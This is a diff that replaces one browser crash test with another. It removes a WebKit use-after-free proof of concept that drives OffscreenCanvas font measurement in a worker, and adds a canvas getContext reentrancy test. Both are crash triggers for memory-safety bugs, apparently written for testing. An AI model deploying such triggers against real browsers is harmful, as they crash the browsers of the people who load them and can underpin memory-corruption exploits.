@@ -1,62 +1,53 @@
+
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>WebKit OffscreenCanvas FontMetrics UAF Test Case</title>
-</head>
-<body>
-    <h1>WebKit FontMetrics Use-After-Free PoC</h1>
-    <p>Este teste valida a segurança de memória em measureTextInternal() com OffscreenCanvas em workers.</p>
-    <div id="status">Executando teste...</div>
-
 <script>
-// Teste baseado no commit 5ccd64b do WebKit
-const WORKER_BODY = `
-const dummies = [];
-for (let i = 0; i < 3500; i++) {
-    const dummy = new OffscreenCanvas(1, 1).getContext('2d');
-    dummy.font = '10px "dummy' + i + '"';
-    dummies.push(dummy);
+function gc() {
+    for (let i = 0; i < 10000; i++)
+        new String("abc");
 }
 
-const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(1100000) + '")';
+function reenter(outer, inner) {
+    let canvas = document.createElement("canvas");
+    let innerCtx;
 
-const keepAlive = [];
-for (let attempt = 0; attempt < 2; attempt++) {
-    const metricsDonor = new FontFace('metricsDonor' + attempt, pendingFontURL);
-    const measured = new FontFace('measured' + attempt, pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
-    self.fonts.add(metricsDonor);
-    self.fonts.add(measured);
-
-    const context = new OffscreenCanvas(64, 64).getContext('2d');
-    context.font = '10px metricsDonor' + attempt + ', measured' + attempt;
-    keepAlive.push(metricsDonor, measured, context);
-
-    // Cherokee range para forçar o CodePath simples no WidthIterator
-    context.measureText('\\u13A0\\u13A2\\u13A4');
+    let outerCtx = canvas.getContext(outer, {
+        get colorSpace() {
+            innerCtx = canvas.getContext(inner);
+            return "srgb";
+        },
+        get alpha() {
+            innerCtx = canvas.getContext(inner);
+            return true;
+        },
+    });
 }
-postMessage('done');
-`;
 
-try {
-    const blob = new Blob([WORKER_BODY], { type: 'application/javascript' });
-    const worker = new Worker(URL.createObjectURL(blob));
-    
-    worker.onmessage = (event) => {
-        if (event.data === 'done') {
-            document.getElementById('status').innerText = 'Teste concluído com sucesso (sem crash).';
-            document.getElementById('status').style.color = 'green';
-        }
-    };
+function reenterOffscreen(outer, inner) {
+    let canvas = document.createElement("canvas");
+    canvas.width = 10;
+    canvas.height = 10;
 
-    worker.onerror = (err) => {
-        document.getElementById('status').innerText = 'Erro no Worker: ' + err.message;
-        document.getElementById('status').style.color = 'red';
-    };
-} catch (e) {
-    document.getElementById('status').innerText = 'Erro ao inicializar o Worker ou OffscreenCanvas: ' + e.message;
-    document.getElementById('status').style.color = 'orange';
+    let innerCtx;
+
+    let outerCtx = canvas.getContext(outer, {
+        get colorSpace() {
+            innerCtx = canvas.getContext(inner);
+            return "srgb";
+        },
+        get alpha() {
+            innerCtx = canvas.getContext(inner);
+            return true;
+        },
+    });
 }
+
+for (let outer of ["2d", "bitmaprenderer"])
+    for (let inner of ["2d", "bitmaprenderer"])
+        reenter(outer, inner);
+
+for (let outer of ["2d", "bitmaprenderer"])
+    for (let inner of ["2d", "bitmaprenderer"])
+        reenterOffscreen(outer, inner);
+
+gc();
 </script>
-</body>
-</html>
